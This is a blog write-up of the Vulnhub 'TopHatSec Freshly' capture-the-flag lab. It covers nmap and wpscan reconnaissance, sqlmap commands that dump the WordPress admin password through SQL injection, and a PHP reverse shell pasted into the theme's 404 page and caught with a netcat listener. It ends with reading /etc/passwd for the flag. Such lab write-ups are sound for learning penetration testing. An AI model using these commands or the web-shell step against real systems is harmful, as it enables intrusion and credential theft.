---
extends: default.liquid
title: Vulnhub's 'TopHatSec Freshly'
date: 2015-04-11T21:03:50Z
---

This is my first writeup of a [Vulnhub](https://vulnhub.com) wargame: Freshly.

The challenge is:

> The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file.

Go grab the image and follow along.

First I need to determine the image's IP address and what services it is running:

```sourceCode
root@kali:~# nmap -sn 192.168.56.0/24

Starting Nmap 6.47 ( https://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.1
Host is up (0.00019s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00088s latency).
MAC Address: 08:00:27:F7:1C:75 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.76 seconds
root@kali:~# nmap -p- 192.168.56.103

Starting Nmap 6.47 ( https://nmap.org ) at 2015-04-10 18:19 BST
Nmap scan report for 192.168.56.103
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
MAC Address: 08:00:27:F2:73:82 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 6.46 sconds
```

So I can see the host is at `192.168.56.103` and has ports _80, 443, and 8080_ open. Browsing to the address presents an animated gif.

![image](https://i.imgur.com/qgkgkgg.png)

My initial reaction is to look at the source, but here I only see the `<img>` tag and the image filename. The image filename could be useful later, but right now I see no use for it.

In that case let's see if the SSL port holds anything more interesting.

![image](https://i.imgur.com/wvHo8ru.png)

Nice, looks like I'm getting somewhere. I follow this link to a wordpress site which sells candy. Generally browsing the site I notice it's a Bitnami install of a Wordpress site, running a few plugins.

<img src="https://i.imgur.com/SHEXup3.png" alt="image" width="600" />

Before I start work on that, let me just see what's at port _8080_. Ah, it's a non _https_ version of the wordpress site. I'm going to use that instead of the _https_ version to avoid any certificate issues and generally make life a bit easier.

Using `wpscan` I can find out which of the installed plugins have vulnerabilities.

```sourceCode
root@kali:~# wpscan -u https://192.168.56.103:8080/wordpress --enumerate vp
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.6
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://192.168.56.103:8080/wordpress/
[+] Started: Fri Apr 10 18:42:00 2015

[!] The WordPress 'https://192.168.56.103:8080/wordpress/readme.html' file exists exposing a version number
[!] Full Path Disclosure (FPD) in: 'https://192.168.56.103:8080/wordpress/wp-includes/rss-functions.php'
[+] Interesting header: SERVER: Apache
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] XML-RPC Interface available under: https://192.168.56.103:8080/wordpress/xmlrpc.php

[+] WordPress version 4.1 identified from meta generator

[+] Enumerating installed plugins (only vulnerable ones) ...

   Time: 00:01:40 <============================================> (952 / 952) 100.00% Time: 00:01:40

[+] We found 4 plugins:

[+] Name: cart66-lite - v1.5.3
 |  Location: https://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/
 |  Readme: https://192.168.56.103:8080/wordpress/wp-content/plugins/cart66-lite/readme.txt

[!] Title: Cart66 Lite <= 1.5.3 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/7737
    Reference: https://research.g0blin.co.uk/g0blin-00022/
    Reference: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9442
[i] Fixed in: 1.5.4

[+] Name: google-analytics-for-wordpress - v5.3.1
 |  Location: https://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/
 |  Readme: https://192.168.56.103:8080/wordpress/wp-content/plugins/google-analytics-for-wordpress/readme.txt

[!] Title: Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7838
    Reference: https://packetstormsecurity.com/files/130716/
    Reference: https://osvdb.org/119334

[+] Name: proplayer - v4.7.9.1
 |  Location: https://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/
 |  Readme: https://192.168.56.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt

[!] Title: ProPlayer 4.7.9.1 - SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/6912
    Reference: https://osvdb.org/93564
    Reference: https://www.exploit-db.com/exploits/25605/

[+] Name: wptouch - v3.6.6
 |  Location: https://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/
 |  Readme: https://192.168.56.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt

[!] Title: WPtouch <= 3.6.6 - Unvalidated Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/7837
    Reference: https://wordpress.org/plugins/wptouch/changelog/
[i] Fixed in: 3.7

[+] Finished: Fri Apr 10 18:43:48 2015
[+] Memory used: 9.027 MB
[+] Elapsed time: 00:01:48
```

There's a few there, so I'll look at each on in turn to see how easy it is to exploit, and what it might yield.

- Cart66 Lite &lt;= 1.5.3 - SQL Injection

  > This requires the user to be logged in, and seeing as I don't have a login I won't get very far with this.

- Google Analytics by Yoast 5.3.2 - Cross-Site Scripting (XSS) \#\#\#

  > This requires admin access to the site, in order to configure the plugin. Another dead end.

- ProPlayer 4.7.9.1 - SQL Injection

  > Not much luck with this. Although it doesn't require a login, I wasn't successful with getting anything out of it.

- WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect

  > I doubt that an unvalidated redirect will be of much use here.

Ok, thinking cap back on.... I need a different angle of attack.

Revisiting the main wordpress site there is something a bit unusual.

![image](https://i.imgur.com/2ddRfdF.png)

Did I miss something? Did I get done by a Jedi mindtrick? Let's see. I'll head back to the main site and try and find some other pages with _DirBuster_.

This is how I set it up

<img src="https://i.imgur.com/auVPaoO.png" alt="image" width="600" />

Using this list I got lucky and received two interesting hits after short while

<img src="https://i.imgur.com/l647X5u.png" alt="image" width="600" />

I've decided to hold back on on the `phpmyadmin` and investigate the `login.php` first. This is what lies at the end of that URL

![image](https://i.imgur.com/c8aSx4n.png)

I could just start attacking this with various SQLi strings, but the beauty of attacking a virtual machine is that I can use tools without the fear of breaking someone else's stuff. Roll out `sqlmap` and let's see what we can find:

```sourceCode
root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit"

<snip>

POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

<snip>

POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y

<snip>

[12:17:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL 5.0.11
```

I've removed some of the output for clarity, but I can see that there's possibility of a blind SQL injection for both `user` and `password` and that it's a MySQL databse. Great. We can carry on using `sqlmap` to try and discover what tables there are and if we can find any useful information.

First I'll get a list of databases on the system. This process takes a little while, so when it asks "_do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? \[Y/n\]_" answer _YES_. It will be done quicker.

```sourceCode
root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit" --dbms=mysql --dbs

<snip>

[12:20:19] [INFO] fetching database names
[12:20:19] [INFO] fetching number of databases
[12:20:19] [INFO] retrieved: 7
[12:20:21] [INFO] retrieved: information_schema
[12:21:36] [INFO] retrieved: login
[12:21:59] [INFO] retrieved: mysql
[12:22:20] [INFO] retrieved: performance_schema
[12:23:33] [INFO] retrieved: phpmyadmin
[12:24:18] [INFO] retrieved: users
[12:24:43] [INFO] retrieved: wordpress8080
available databases [7]:
[*] information_schema
[*] login
[*] mysql
[*] performance_schema
[*] phpmyadmin
[*] users
[*] wordpress8080

[12:25:44] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.56.103'

[*] shutting down at 12:25:44
```

It found seven databases, amongst which is an interesting one: `wordpress8080`. This seems to be the wordpress database, so I can start attacking that and see if I can get the _admin_ account. The `login` and `users` databases also look interesting, so let's take a look at those later. Additionally, if I can get a login, especially an _admin_ one, I could try to exploit the plugins later on. After all, it does say there are multiple ways into this VM.

```sourceCode
root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit" --dbms=mysql --tables -D wordpress8080

<snip>

Database: wordpress8080
[1 table]
+-------+
| users |
+-------+

root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit" --dbms=mysql --dump -T users -D wordpress8080

<snip>

Database: wordpress8080
Table: users
[1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+
```

The admin password for the wordpress site, excellent. As for the other tables, I didn't find anything useful in them, so I won't post the output here. In that case I might aswell just login to the wordpress site now. Basically I have full control of the wordpress site now, so what should I do? How does a PHP shell sound? Good? Alright then... `cd /usr/share/webshells/php` and I'm going to use the `php-reverse-shell.php` and replace the site's _404_ with that.

To do that I need to edit the theme in the admin section, and just paste in the contents. The I need to open a listening `netcat` session and browse to a non-existant page on the site.

```sourceCode
root@kali:/usr/share/webshells/php# nc -lvnp 1337
listening on [any] 1337 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 43875
Linux Freshly 3.13.0-45-generic #74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux
 19:36:34 up  5:45,  0 users,  load average: 0.08, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ cd /etc
$ cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
# YOU STOLE MY SECRET FILE!
# SECRET = "NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!"
```

I had to poke around the file system a bit to find this, but `/etc/passwd` is usually a _go-to_ file if you get access to a system. Otherwise I'd still be looking for the file now :)

So that's one way to do it.

This seems to be the most direct route in. It might be worth exploring the vulnerabilities on the plugins, but it's late now, so I'll save that for another time.
